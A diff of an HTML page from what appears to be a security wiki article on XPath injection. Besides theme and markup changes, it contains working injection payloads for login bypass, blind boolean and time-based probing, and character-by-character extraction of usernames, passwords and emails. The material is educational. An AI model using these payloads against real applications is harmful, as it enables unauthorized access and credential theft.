@@ -1,39 +1,60 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="en" dir="ltr" data-theme="light">
 <head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="description" content="XPath Injection # XPath Injection is a vulnerability that occurs when user-controlled input is unsafely concatenated into XPath queries evaluating XML documents, enabling attackers to extract, manipulate, or bypass logic in XML-based applications.
-Fundamentals # How XPath Works # XPath is a query language used to locate and retrieve nodes from XML documents. Applications often use XPath to search XML files for user records, configuration data, product information, or authentication details.">
-<meta name="theme-color" content="#FFFFFF">
-<meta name="color-scheme" content="light dark"><meta property="og:title" content="XPath Injection" />
-<meta property="og:description" content="XPath Injection # XPath Injection is a vulnerability that occurs when user-controlled input is unsafely concatenated into XPath queries evaluating XML documents, enabling attackers to extract, manipulate, or bypass logic in XML-based applications.
-Fundamentals # How XPath Works # XPath is a query language used to locate and retrieve nodes from XML documents. Applications often use XPath to search XML files for user records, configuration data, product information, or authentication details." />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/XPath-Injection/" /><meta property="article:section" content="docs" />
-
-<meta property="article:modified_time" content="2026-08-05T21:53:05+05:30" />
-<title>XPath Injection | Cyber Security Wiki</title>
-<link rel="manifest" href="/manifest.json">
-<link rel="icon" href="/favicon.png" type="image/x-icon">
-<link rel="stylesheet" href="/book.min.565a95e2043493949e3fa72db3ec317e1e40f462858e732a1b18d1354e9c030c.css" integrity="sha256-VlqV4gQ0k5SeP6cts&#43;wxfh5A9GKFjnMqGxjRNU6cAww=" crossorigin="anonymous">
-  <script defer src="/flexsearch.min.js"></script>
-  <script defer src="/en.search.min.78166b9d46e23e0ea915cb6887a30b633e7bc4fad10c8b6b9f6fa532271c19ba.js" integrity="sha256-eBZrnUbiPg6pFctoh6MLYz57xPrRDItrn2&#43;lMiccGbo=" crossorigin="anonymous"></script>
-
-  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
-<!--
+  <!--
 Made with Book Theme
 https://github.com/alex-shpak/hugo-book
 -->
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="XPath Injection# XPath Injection is a vulnerability that occurs when user-controlled input is unsafely concatenated into XPath queries evaluating XML documents, enabling attackers to extract, manipulate, or bypass logic in XML-based applications.
+Fundamentals# How XPath Works# XPath is a query language used to locate and retrieve nodes from XML documents. Applications often use XPath to search XML files for user records, configuration data, product information, or authentication details.
+Example XML:
+">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#2e3440">
+<meta name="color-scheme" content="light dark"><meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/XPath-Injection/">
+	<meta property="og:site_name" content="Cyber Security Wiki">
+	<meta property="og:title" content="XPath Injection">
+	<meta property="og:description" content="XPath Injection# XPath Injection is a vulnerability that occurs when user-controlled input is unsafely concatenated into XPath queries evaluating XML documents, enabling attackers to extract, manipulate, or bypass logic in XML-based applications.
+Fundamentals# How XPath Works# XPath is a query language used to locate and retrieve nodes from XML documents. Applications often use XPath to search XML files for user records, configuration data, product information, or authentication details.
+Example XML:">
+	<meta property="og:locale" content="en">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="docs">
+		<meta property="article:modified_time" content="2026-08-05T21:53:05+05:30">
+
+
+	<meta itemprop="name" content="XPath Injection">
+	<meta itemprop="description" content="XPath Injection# XPath Injection is a vulnerability that occurs when user-controlled input is unsafely concatenated into XPath queries evaluating XML documents, enabling attackers to extract, manipulate, or bypass logic in XML-based applications.
+Fundamentals# How XPath Works# XPath is a query language used to locate and retrieve nodes from XML documents. Applications often use XPath to search XML files for user records, configuration data, product information, or authentication details.
+Example XML:">
+	<meta itemprop="dateModified" content="2026-08-05T21:53:05+05:30">
+	<meta itemprop="wordCount" content="802">
+
+<title>XPath Injection • Cyber Security Wiki</title>
+<link rel="icon" href="/favicon.png" >
+<link rel="manifest" href="/manifest.json">
+<link rel="canonical" href="https://cyber-security.wiki/docs/application-security/web/XPath-Injection/">
+<link rel="stylesheet" href="/book.min.4d77e98d764f495b145946ef9260681bab38aaf7bc01f96a6f61a3a0fea19dbf.css" integrity="sha256-TXfpjXZPSVsUWUbvkmBoG6s4qve8Aflqb2GjoP6hnb8=" crossorigin="anonymous">
+
+
+
+  <script defer type="module" src="/en.search.min.07d8a67671a2c683431c7034b07b0f4b6c6daae7a9c289fde2e3663a9ff4e6c5.js" integrity="sha256-B9imdnGixoNDHHA0sHsPS2xtquepwon94uNmOp/05sU=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+
   
 </head>
-<body dir="ltr">
+<body dir="ltr" class="book-kind-page book-type-docs">
   <input type="checkbox" class="hidden toggle" id="menu-control" />
   <input type="checkbox" class="hidden toggle" id="toc-control" />
   <main class="container flex">
-    <aside class="book-menu">
-      <div class="book-menu-content">
-        
+    
+<aside class="book-menu">
+  <div class="book-menu-content">
+    
   <nav>
 <h2 class="book-brand">
   <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Cyber Security Wiki</span>
@@ -41,11 +62,15 @@ https://github.com/alex-shpak/hugo-book
 </h2>
 
 
-<div class="book-search">
-  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+<div class="book-search hidden">
+  <input id="book-search-input" type="text" 
+    placeholder="Search"
+    aria-label="Search"
+    maxlength="64" />
   <div class="book-search-spinner hidden"></div>
   <ul id="book-search-results"></ul>
 </div>
+<script>document.querySelector(".book-search").classList.remove("hidden")</script>
 
 
 
@@ -56,9 +81,6 @@ https://github.com/alex-shpak/hugo-book
 
 
 
-
-
-  
 
 
 
@@ -73,8 +95,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3478c05c39c328756601a040a5f9b7dc" class="toggle" checked />
-    <label for="section-3478c05c39c328756601a040a5f9b7dc" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-1f4bf90b10ddb9d04537ec779b672afa" class="toggle" checked />
+    <label for="section-1f4bf90b10ddb9d04537ec779b672afa" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Application Security</a>
     </label>
   
@@ -90,8 +112,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3d187f458be5e96a9f7134b06fcbe171" class="toggle"  />
-    <label for="section-3d187f458be5e96a9f7134b06fcbe171" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-97ce584ed7ffb43a07e43ad9f5889c71" class="toggle"  />
+    <label for="section-97ce584ed7ffb43a07e43ad9f5889c71" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Thick Client</a>
     </label>
   
@@ -177,8 +199,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="toggle"  />
-    <label for="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-26c356cfc062017e944cd67af2378245" class="toggle"  />
+    <label for="section-26c356cfc062017e944cd67af2378245" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Vulnerable Applications</a>
     </label>
   
@@ -225,8 +247,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-305f8624390448e7b7dfdcd57bcf3063" class="toggle" checked />
-    <label for="section-305f8624390448e7b7dfdcd57bcf3063" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-db0925704b156fffd3db5c66cb42d41d" class="toggle" checked />
+    <label for="section-db0925704b156fffd3db5c66cb42d41d" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Web</a>
     </label>
   
@@ -980,8 +1002,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-eddb28de10b6358a7d90165be197c24d" class="toggle"  />
-    <label for="section-eddb28de10b6358a7d90165be197c24d" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-0d71dd2ccc73d3f39ad17c2db51c8573" class="toggle"  />
+    <label for="section-0d71dd2ccc73d3f39ad17c2db51c8573" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Cloud Security</a>
     </label>
   
@@ -1002,8 +1024,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-80f73357b2e3d82569ab2419d9c8fd53" class="toggle"  />
-    <label for="section-80f73357b2e3d82569ab2419d9c8fd53" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5ef99b8721144773b97f7bfef900362b" class="toggle"  />
+    <label for="section-5ef99b8721144773b97f7bfef900362b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">DevSecOps</a>
     </label>
   
@@ -1024,8 +1046,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-f8c2cedc89ecea36eb3aab749e9d9325" class="toggle"  />
-    <label for="section-f8c2cedc89ecea36eb3aab749e9d9325" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-a54fb62d899fdd9f3e0ff5a546ca08ec" class="toggle"  />
+    <label for="section-a54fb62d899fdd9f3e0ff5a546ca08ec" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Exploit Development</a>
     </label>
   
@@ -1046,8 +1068,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="toggle"  />
-    <label for="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-2aeefa6ddff0a8e5db97003607c446af" class="toggle"  />
+    <label for="section-2aeefa6ddff0a8e5db97003607c446af" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">IoT Security</a>
     </label>
   
@@ -1068,8 +1090,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="toggle"  />
-    <label for="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-150b068623f422b911e0c10751e41d4b" class="toggle"  />
+    <label for="section-150b068623f422b911e0c10751e41d4b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Machine Learning</a>
     </label>
   
@@ -1103,8 +1125,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3110560962cac834dcd3aead95e804a4" class="toggle"  />
-    <label for="section-3110560962cac834dcd3aead95e804a4" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5d1d2284d8b625a6ff29beaf70c29606" class="toggle"  />
+    <label for="section-5d1d2284d8b625a6ff29beaf70c29606" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Network</a>
     </label>
   
@@ -1125,8 +1147,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-089d0b2a47920473e631158da2244e55" class="toggle"  />
-    <label for="section-089d0b2a47920473e631158da2244e55" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5f3c3bc6686a139a7fd4ba11c67ca45b" class="toggle"  />
+    <label for="section-5f3c3bc6686a139a7fd4ba11c67ca45b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Red Teaming</a>
     </label>
   
@@ -1147,8 +1169,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-b1f24361e619eb3af87e435a6f600cbe" class="toggle"  />
-    <label for="section-b1f24361e619eb3af87e435a6f600cbe" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-48d01542c459fd722a2e871cc9bbd985" class="toggle"  />
+    <label for="section-48d01542c459fd722a2e871cc9bbd985" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Threat Modelling</a>
     </label>
   
@@ -1169,35 +1191,13 @@ https://github.com/alex-shpak/hugo-book
 
 
 
-<hr>
-<b>
 
-
-  
-<ul>
-  
-  <li>
-    <a href="/contribute/" >
-        Contribute
-      </a>
-  </li>
-  
-  <li>
-    <a href="https://securecode.wiki" target="_blank" rel="noopener">
-        Secure Code Wiki by Payatu
-      </a>
-  </li>
-  
-</ul>
+<ul><li><a href="/contribute/" title="Contribute">contribute</a></li><li><a href="https://securecode.wiki" target="_blank" rel="noopener">Secure Code Wiki by Payatu</a></li></ul>
 
 
 
 
-
-
-</b>
 </nav>
-
 
 
 
@@ -1205,30 +1205,31 @@ https://github.com/alex-shpak/hugo-book
   <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
 
 
+
+  </div>
+</aside>
  
-      </div>
-    </aside>
 
     <div class="book-page">
-      <header class="book-header">
+      <header class="book-header hidden">
         
   <div class="flex align-center justify-between">
   <label for="menu-control">
-    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+    <img src="/icons/menu.svg" class="book-icon" alt="Menu" />
   </label>
 
-  <strong>XPath Injection</strong>
+  <h3>XPath Injection</h3>
 
   <label for="toc-control">
     
-    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    <img src="/icons/toc.svg" class="book-icon" alt="Table of Contents" />
     
   </label>
 </div>
 
 
   
-  <aside class="hidden clearfix">
+  <aside class="hidden">
     
   
 <nav id="TableOfContents">
@@ -1323,87 +1324,70 @@ https://github.com/alex-shpak/hugo-book
 
       
       
-  <article class="markdown"><h1 id="xpath-injection">
-  XPath Injection
-  <a class="anchor" href="#xpath-injection">#</a>
-</h1>
+  <article class="markdown book-article"><h1 id="xpath-injection">XPath Injection<a class="anchor" href="#xpath-injection">#</a></h1>
 <p><strong>XPath Injection</strong> is a vulnerability that occurs when user-controlled input is unsafely concatenated into XPath queries evaluating XML documents, enabling attackers to extract, manipulate, or bypass logic in XML-based applications.</p>
 <hr>
-<h2 id="fundamentals">
-  Fundamentals
-  <a class="anchor" href="#fundamentals">#</a>
-</h2>
-<h3 id="how-xpath-works">
-  How XPath Works
-  <a class="anchor" href="#how-xpath-works">#</a>
-</h3>
+<h2 id="fundamentals">Fundamentals<a class="anchor" href="#fundamentals">#</a></h2>
+<h3 id="how-xpath-works">How XPath Works<a class="anchor" href="#how-xpath-works">#</a></h3>
 <p>XPath is a query language used to locate and retrieve nodes from XML documents. Applications often use XPath to search XML files for user records, configuration data, product information, or authentication details.</p>
 <p>Example XML:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;users&gt;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;users&gt;</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;user&gt;</span>
 </span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;username&gt;</span>admin<span style="color:#f92672">&lt;/username&gt;</span>
 </span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;password&gt;</span>admin123<span style="color:#f92672">&lt;/password&gt;</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/user&gt;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/users&gt;</span>
-</span></span></code></pre></div><p>Example XPath query:</p>
-<pre tabindex="0"><code>/users/user[username=&#39;admin&#39;]
-</code></pre><p>If user input is directly concatenated into the query, an attacker may manipulate the XPath expression and change its logic.</p>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/users&gt;</span></span></span></code></pre></div><p>Example XPath query:</p>
+<pre tabindex="0"><code>/users/user[username=&#39;admin&#39;]</code></pre><p>If user input is directly concatenated into the query, an attacker may manipulate the XPath expression and change its logic.</p>
 <hr>
-<h2 id="common-xpath-functions">
-  Common XPath Functions
-  <a class="anchor" href="#common-xpath-functions">#</a>
-</h2>
+<h2 id="common-xpath-functions">Common XPath Functions<a class="anchor" href="#common-xpath-functions">#</a></h2>
 <table>
-<thead>
-<tr>
-<th>Function</th>
-<th>Purpose</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>count()</code></td>
-<td>Count matching nodes</td>
-</tr>
-<tr>
-<td><code>name()</code></td>
-<td>Get node name</td>
-</tr>
-<tr>
-<td><code>text()</code></td>
-<td>Read node value</td>
-</tr>
-<tr>
-<td><code>substring()</code></td>
-<td>Extract characters</td>
-</tr>
-<tr>
-<td><code>string-length()</code></td>
-<td>Determine string length</td>
-</tr>
-<tr>
-<td><code>contains()</code></td>
-<td>Check substring</td>
-</tr>
-<tr>
-<td><code>starts-with()</code></td>
-<td>Check prefix</td>
-</tr>
-<tr>
-<td><code>last()</code></td>
-<td>Last node</td>
-</tr>
-<tr>
-<td><code>position()</code></td>
-<td>Current node index</td>
-</tr>
-</tbody>
+	<thead>
+			<tr>
+					<th>Function</th>
+					<th>Purpose</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><code>count()</code></td>
+					<td>Count matching nodes</td>
+			</tr>
+			<tr>
+					<td><code>name()</code></td>
+					<td>Get node name</td>
+			</tr>
+			<tr>
+					<td><code>text()</code></td>
+					<td>Read node value</td>
+			</tr>
+			<tr>
+					<td><code>substring()</code></td>
+					<td>Extract characters</td>
+			</tr>
+			<tr>
+					<td><code>string-length()</code></td>
+					<td>Determine string length</td>
+			</tr>
+			<tr>
+					<td><code>contains()</code></td>
+					<td>Check substring</td>
+			</tr>
+			<tr>
+					<td><code>starts-with()</code></td>
+					<td>Check prefix</td>
+			</tr>
+			<tr>
+					<td><code>last()</code></td>
+					<td>Last node</td>
+			</tr>
+			<tr>
+					<td><code>position()</code></td>
+					<td>Current node index</td>
+			</tr>
+	</tbody>
 </table>
 <hr>
-<h2 id="xpath-versions">
-  XPath Versions
-  <a class="anchor" href="#xpath-versions">#</a>
-</h2>
+<h2 id="xpath-versions">XPath Versions<a class="anchor" href="#xpath-versions">#</a></h2>
 <ul>
 <li>XPath 1.0 (Most common)</li>
 <li>XPath 2.0</li>
@@ -1411,14 +1395,8 @@ https://github.com/alex-shpak/hugo-book
 </ul>
 <p>Most web applications still use XPath 1.0.</p>
 <hr>
-<h2 id="identifying-xpath-injection">
-  Identifying XPath Injection
-  <a class="anchor" href="#identifying-xpath-injection">#</a>
-</h2>
-<h3 id="possible-signs">
-  Possible Signs:
-  <a class="anchor" href="#possible-signs">#</a>
-</h3>
+<h2 id="identifying-xpath-injection">Identifying XPath Injection<a class="anchor" href="#identifying-xpath-injection">#</a></h2>
+<h3 id="possible-signs">Possible Signs:<a class="anchor" href="#possible-signs">#</a></h3>
 <ul>
 <li>XML-based backend</li>
 <li>Login or search forms using XML datasets</li>
@@ -1426,10 +1404,7 @@ https://github.com/alex-shpak/hugo-book
 <li>Unexpected errors on special character input (<code>'</code>, <code>&quot;</code>, <code>]</code>, <code>)</code>, <code>@</code>, etc.)</li>
 </ul>
 <hr>
-<h2 id="attack-surface">
-  Attack Surface
-  <a class="anchor" href="#attack-surface">#</a>
-</h2>
+<h2 id="attack-surface">Attack Surface<a class="anchor" href="#attack-surface">#</a></h2>
 <p>Look for XML-backed functionality in:</p>
 <ul>
 <li>Login forms</li>
@@ -1445,198 +1420,118 @@ https://github.com/alex-shpak/hugo-book
 <li>Legacy Java/.NET applications</li>
 </ul>
 <hr>
-<h2 id="testing-inputs-basic-payloads">
-  Testing Inputs (Basic Payloads)
-  <a class="anchor" href="#testing-inputs-basic-payloads">#</a>
-</h2>
+<h2 id="testing-inputs-basic-payloads">Testing Inputs (Basic Payloads)<a class="anchor" href="#testing-inputs-basic-payloads">#</a></h2>
 <table>
-<thead>
-<tr>
-<th>Goal</th>
-<th>Payload</th>
-<th>Notes</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Authentication Bypass</td>
-<td><code>' or '1' = '1</code></td>
-<td>Similar to SQLi logic</td>
-</tr>
-<tr>
-<td>Universal True</td>
-<td><code>admin' or '1'='1</code></td>
-<td>Always returns true</td>
-</tr>
-<tr>
-<td>Universal False</td>
-<td><code>admin' and '1'='2</code></td>
-<td>Always false</td>
-</tr>
-<tr>
-<td>Close predicate</td>
-<td><code>' or '1'='1' or ''='</code></td>
-<td>Unbalances logic</td>
-</tr>
-<tr>
-<td>Blind Bypass</td>
-<td><code>admin' or count(//user) &gt; 0 or ''='</code></td>
-<td>Check response time / content</td>
-</tr>
-</tbody>
+	<thead>
+			<tr>
+					<th>Goal</th>
+					<th>Payload</th>
+					<th>Notes</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>Authentication Bypass</td>
+					<td><code>' or '1' = '1</code></td>
+					<td>Similar to SQLi logic</td>
+			</tr>
+			<tr>
+					<td>Universal True</td>
+					<td><code>admin' or '1'='1</code></td>
+					<td>Always returns true</td>
+			</tr>
+			<tr>
+					<td>Universal False</td>
+					<td><code>admin' and '1'='2</code></td>
+					<td>Always false</td>
+			</tr>
+			<tr>
+					<td>Close predicate</td>
+					<td><code>' or '1'='1' or ''='</code></td>
+					<td>Unbalances logic</td>
+			</tr>
+			<tr>
+					<td>Blind Bypass</td>
+					<td><code>admin' or count(//user) &gt; 0 or ''='</code></td>
+					<td>Check response time / content</td>
+			</tr>
+	</tbody>
 </table>
 <hr>
-<h2 id="authentication-bypass-attacks">
-  Authentication Bypass Attacks
-  <a class="anchor" href="#authentication-bypass-attacks">#</a>
-</h2>
-<h3 id="scenario-xpath-query-on-login">
-  Scenario: XPath Query on Login
-  <a class="anchor" href="#scenario-xpath-query-on-login">#</a>
-</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>/users/user[username/text()=&#39;admin&#39; and password/text()=&#39;admin&#39;]
-</span></span></code></pre></div><h3 id="bypass-payloads">
-  Bypass Payloads
-  <a class="anchor" href="#bypass-payloads">#</a>
-</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>admin&#39; or &#39;1&#39;=&#39;1
+<h2 id="authentication-bypass-attacks">Authentication Bypass Attacks<a class="anchor" href="#authentication-bypass-attacks">#</a></h2>
+<h3 id="scenario-xpath-query-on-login">Scenario: XPath Query on Login<a class="anchor" href="#scenario-xpath-query-on-login">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>/users/user[username/text()=&#39;admin&#39; and password/text()=&#39;admin&#39;]</span></span></code></pre></div><h3 id="bypass-payloads">Bypass Payloads<a class="anchor" href="#bypass-payloads">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>admin&#39; or &#39;1&#39;=&#39;1
 </span></span><span style="display:flex;"><span>admin&#39; or &#39;a&#39;=&#39;a
-</span></span><span style="display:flex;"><span>&#39; or &#39;&#39;=&#39;
-</span></span></code></pre></div><ul>
+</span></span><span style="display:flex;"><span>&#39; or &#39;&#39;=&#39;</span></span></code></pre></div><ul>
 <li>These manipulate the query to return true, regardless of password.</li>
 </ul>
 <hr>
-<h2 id="blind-xpath-injection">
-  Blind XPath Injection
-  <a class="anchor" href="#blind-xpath-injection">#</a>
-</h2>
+<h2 id="blind-xpath-injection">Blind XPath Injection<a class="anchor" href="#blind-xpath-injection">#</a></h2>
 <p>Used when no error messages or output leakage occurs.</p>
-<h3 id="boolean-based-truefalse">
-  Boolean-based (True/False)
-  <a class="anchor" href="#boolean-based-truefalse">#</a>
-</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>&#39; or count(//user)=1 or &#39;1&#39;=&#39;2
-</span></span><span style="display:flex;"><span>&#39; or count(//user)=2 or &#39;1&#39;=&#39;2
-</span></span></code></pre></div><h3 id="character-extraction">
-  Character Extraction
-  <a class="anchor" href="#character-extraction">#</a>
-</h3>
+<h3 id="boolean-based-truefalse">Boolean-based (True/False)<a class="anchor" href="#boolean-based-truefalse">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>&#39; or count(//user)=1 or &#39;1&#39;=&#39;2
+</span></span><span style="display:flex;"><span>&#39; or count(//user)=2 or &#39;1&#39;=&#39;2</span></span></code></pre></div><h3 id="character-extraction">Character Extraction<a class="anchor" href="#character-extraction">#</a></h3>
 <p>Using substring and string-length:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>&#39; or substring(name(/*),1,1)=&#39;r&#39; or &#39;1&#39;=&#39;2
-</span></span><span style="display:flex;"><span>&#39; or string-length(name(/*))=4 or &#39;1&#39;=&#39;2
-</span></span></code></pre></div><h3 id="time-based-xpath-requires-app-using-xsltxpath-extension-functions">
-  Time-based XPath (requires app using XSLT/XPath extension functions)
-  <a class="anchor" href="#time-based-xpath-requires-app-using-xsltxpath-extension-functions">#</a>
-</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>&#39; or java.lang.Thread.sleep(5000) or &#39;1&#39;=&#39;2
-</span></span></code></pre></div><hr>
-<h2 id="enumeration-examples">
-  Enumeration Examples
-  <a class="anchor" href="#enumeration-examples">#</a>
-</h2>
-<h3 id="get-number-of-users">
-  Get number of users
-  <a class="anchor" href="#get-number-of-users">#</a>
-</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>&#39; or count(//user)=1 or &#39;1&#39;=&#39;2
-</span></span></code></pre></div><h3 id="extract-number-of-child-nodes">
-  Extract Number of Child Nodes
-  <a class="anchor" href="#extract-number-of-child-nodes">#</a>
-</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>name=&#39; or count(//user[position()=1]/child::node())=5  or &#39;1&#39;=&#39;1<span style="color:#960050;background-color:#1e0010">&amp;</span>pass=test
-</span></span></code></pre></div><h3 id="extract-number-of-characters">
-  Extract number of characters
-  <a class="anchor" href="#extract-number-of-characters">#</a>
-</h3>
-<h3 id="extract-user-name-character-by-character">
-  Extract user name character-by-character
-  <a class="anchor" href="#extract-user-name-character-by-character">#</a>
-</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>&#39; or substring(//user[1]/username/text(),1,1)=&#39;a&#39; or &#39;1&#39;=&#39;2
-</span></span><span style="display:flex;"><span>&#39; or substring(//user[1]/username/text(),2,1)=&#39;d&#39; or &#39;1&#39;=&#39;2
-</span></span></code></pre></div><h3 id="extract-password">
-  Extract Password
-  <a class="anchor" href="#extract-password">#</a>
-</h3>
-<pre tabindex="0"><code>&#39; or substring(//user[1]/password/text(),1,1)=&#39;a&#39; or &#39;1&#39;=&#39;2
-</code></pre><hr>
-<h3 id="extract-email">
-  Extract Email
-  <a class="anchor" href="#extract-email">#</a>
-</h3>
-<pre tabindex="0"><code>&#39; or substring(//user[1]/email/text(),1,1)=&#39;a&#39; or &#39;1&#39;=&#39;2
-</code></pre><hr>
-<h3 id="count-users">
-  Count Users
-  <a class="anchor" href="#count-users">#</a>
-</h3>
-<pre tabindex="0"><code>&#39; or count(//user)=5 or &#39;1&#39;=&#39;2
-</code></pre><hr>
-<h2 id="xpath-injection-techniques-summary">
-  XPath Injection Techniques Summary
-  <a class="anchor" href="#xpath-injection-techniques-summary">#</a>
-</h2>
